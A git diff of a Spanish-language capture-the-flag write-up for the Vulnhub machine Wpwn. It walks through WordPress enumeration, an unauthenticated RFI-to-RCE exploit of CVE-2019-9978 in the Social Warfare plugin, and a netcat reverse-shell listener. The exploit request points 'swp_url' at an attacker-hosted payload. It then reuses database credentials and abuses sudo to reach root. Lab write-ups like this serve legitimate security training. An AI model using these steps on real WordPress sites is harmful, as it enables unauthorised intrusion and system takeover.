@@ -1,3 +1,23 @@
+---
+layout: single
+title: Wpwn - Vulnhub
+excerpt: "Para resolver ésta máquina, descubrimos a la hora de la enumeración Web que está corriendo un CMS WordPress el cual enumeramos, así descubriendo qué contiene el plugin Social Warfare, con una versión vulnerable a RFI sin estar auténticado, convirtiendo éste RFI a RCE, para posterior entablarnos una Reverse Shell. Una vez dentro, reutilizamos la contraseña de la DB del CMS para convertirnos en un usuario válido del sistema, y por último, como este usuario nos aprovechamos de los SUDOERS para volvernos ROOT."
+date: 16/11/2023
+classes: wide
+header:
+  teaser_home_page: true
+  icon: /assets/images/vulnhub.webp
+
+tags:
+  - Web Enumeration
+  - WordPress Enumeration
+  - WordPress Plugin Social Warfare < 3.5.3 Exploitation (RFI to RCE)
+  - Password Reuse (User Pivoting)
+  - Abusing sudoers
+  - CVE-2019-9978
+---
+Para resolver ésta máquina, descubrimos a la hora de la enumeración Web que está corriendo un CMS WordPress el cual enumeramos, así descubriendo qué contiene el plugin Social Warfare, con una versión vulnerable a RFI sin estar auténticado, convirtiendo éste RFI a RCE, para posterior entablarnos una Reverse Shell. Una vez dentro, reutilizamos la contraseña de la DB del CMS para convertirnos en un usuario válido del sistema, y por último, como este usuario nos aprovechamos de los SUDOERS para volvernos ROOT.
+
 
 
 # PortScan
@@ -34,7 +54,7 @@ gobuster dir -u http://192.168.204.169 -w /usr/share/SecLists/Discovery/Web-Cont
 ```
 
 Descubriendo así un directorio existente en el servicio Web con nombre "**/wordpress**"
-![[Pasted image 20231116132515.png]]
+![](/assets/images/htb-writeup-wpwn/Pasted image 20231116132515.png)
 
 Es decir, qué está corriendo un **CMS** **WordPress** en el servicio web Apache del **:80**
 
@@ -42,7 +62,7 @@ Es decir, qué está corriendo un **CMS** **WordPress** en el servicio web Apach
 ____
 
 Echándole un vistazo al código fuente para ver plugins...
-![[Pasted image 20231116132740.png]]
+![](/assets/images/htb-writeup-wpwn/Pasted image 20231116132740.png)
 
 Vemos que como uno de sus **plugins** tiene el "**Social Warfare v3.5.2**" que sí indagamos sobre posibles vulnerabilidades, encontraremos la vulnerabilidad **CVE-2019-9978** qué podemos llevar a cabo un **RCE** sin estar autenticados en ésta versión de Social Warfare.
 
@@ -75,12 +95,12 @@ nc -nlvp 443
 website/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://IP_ATACANTE/PAYLOAD
 ```
 
-![[Pasted image 20231116134704.png]]
+![](/assets/images/htb-writeup-wpwn/Pasted image 20231116134704.png)
 
 
 Y recibiríamos nuestra **Reverse Shell**.
 
-![[Pasted image 20231116134947.png]]
+![](/assets/images/htb-writeup-wpwn/Pasted image 20231116134947.png)
 Ya tan sólo quedaría darle **tratamiento a la TTY**, que sino sabes darle tratamiento te recomiendo [((Leer este POST))](https://4uli.github.io/tratamiento-tty/)
 
 # Escalada de Privilegios #1 
@@ -88,13 +108,13 @@ _____________
 
 Indagando en los recursos **WordPress** qué desde fuera no tenemos acceso, encontraríamos el "**wp-config.php**" qué es donde está la configuración del mismo CMS, y sí le echamos un ojo encontraríamos las credenciales de la DB.
 
-![[Pasted image 20231116135220.png]]
+![](/assets/images/htb-writeup-wpwn/Pasted image 20231116135220.png)
 
 y viendo los usuarios válidos del sistema en el **Passwd**, encontraríamos el usuario **takis**.
-![[Pasted image 20231116135351.png]]
+![](/assets/images/htb-writeup-wpwn/Pasted image 20231116135351.png)
 
 Por ende, se me ocurre colocar ésta credencial en el usuarios takis.
-![[Pasted image 20231116135502.png]]
+![](/assets/images/htb-writeup-wpwn/Pasted image 20231116135502.png)
 
 Logrando así entrar como **takis**, gracias a una reutilización de contraseña.
 
@@ -106,11 +126,11 @@ Sí como **takis**, listamos los permisos **SUDOERS**.
 ```bash
 sudo -l
 ```
-![[Pasted image 20231116135731.png]]
+![](/assets/images/htb-writeup-wpwn/Pasted image 20231116135731.png)
 
 Podemos ejecutar cualquier comando como quién sea, es decir, podemos convertirnos en **root** tan fácil como:
 ```bash
 sudo su
 ```
 
-![[Pasted image 20231116135828.png]]
+![](/assets/images/htb-writeup-wpwn/Pasted image 20231116135828.png)
